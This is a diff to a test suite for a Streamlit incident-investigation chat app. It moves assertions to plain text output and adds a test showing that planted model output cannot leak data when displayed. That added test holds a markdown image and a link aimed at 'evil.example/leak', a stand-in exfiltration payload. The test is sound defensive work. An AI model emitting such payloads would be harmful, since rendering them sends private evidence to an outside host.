@@ -66,9 +66,19 @@ def test_production_uses_password_login_and_in_process_chat(settings, monkeypatc
     button(test, "Open workspace").click().run()
     assert test.session_state["authenticated"] and not test.exception and not test.chat_input[0].disabled
     test.chat_input[0].set_value("Investigate the incident").run()
-    assert not test.exception and any("Answer" in item.value for item in test.markdown)
+    assert not test.exception and any("Answer" in item.value for item in test.text)
     invoke.assert_called_once()
     assert "access_ticket" not in invoke.call_args.kwargs
+
+
+def test_model_text_is_plain_text_so_a_planted_image_or_link_cannot_fire(settings, monkeypatch):
+    planted = "Cause: ![x](https://evil.example/leak?d=redacted-evidence) [click](https://evil.example/go)"
+    monkeypatch.setattr(chat, "invoke", lambda *args, **kwargs: chat.ChatResult(planted, "ok"))
+    test = app().run()
+    test.chat_input[0].set_value("Investigate <b>this</b> ![y](https://evil.example/p)").run()
+    assert not test.exception
+    assert any(item.value == planted for item in test.text)
+    assert not any("evil.example" in item.value for item in test.markdown)  # nothing renders it as markdown
 
 
 def test_login_and_logout(settings):
@@ -104,7 +114,7 @@ def test_ui_safe_failure_and_retry(settings, monkeypatch, code, message):
     assert any(code in item.value for item in test.caption)
     button(test, "Retry in a new conversation").click().run()
     assert test.session_state["session_id"] != original_session
-    assert any("Recovered answer" in item.value for item in test.markdown)
+    assert any("Recovered answer" in item.value for item in test.text)
     assert invoke.call_count == 2
 
 
@@ -123,7 +133,7 @@ def test_ui_partial_answer_visible(settings, monkeypatch):
     test = app().run()
     test.chat_input[0].set_value("Investigate").run()
     assert not test.exception
-    assert any("Evidence received" in item.value for item in test.markdown)
+    assert any("Evidence received" in item.value for item in test.text)
     assert any("Partial result" in item.value for item in test.caption)
 
 
@@ -204,7 +214,7 @@ def test_local_tools_mode_enables_chat_without_deployed_bindings(settings, monke
     assert test.expander[0].label == "Connection details"
     assert "Local tools (this machine's AWS credentials)" in str(test.json[0].value)
     test.chat_input[0].set_value("Investigate the incident").run()
-    assert not test.exception and any("Local answer" in item.value for item in test.markdown)
+    assert not test.exception and any("Local answer" in item.value for item in test.text)
     invoke.assert_called_once()
 
 
@@ -434,7 +444,7 @@ def test_chat_reports_live_steps_and_shows_the_cost_of_each_answer(settings, mon
     button(test, "Open workspace").click().run()
     test.chat_input[0].set_value("Investigate the incident").run()
     assert not test.exception and len(steps) == 1
-    assert any("Answer" in item.value for item in test.markdown)
+    assert any("Answer" in item.value for item in test.text)
     assert any(
         item.value == "3,500 tokens" or item.value.startswith("3,500 tokens · ") for item in test.caption
     )
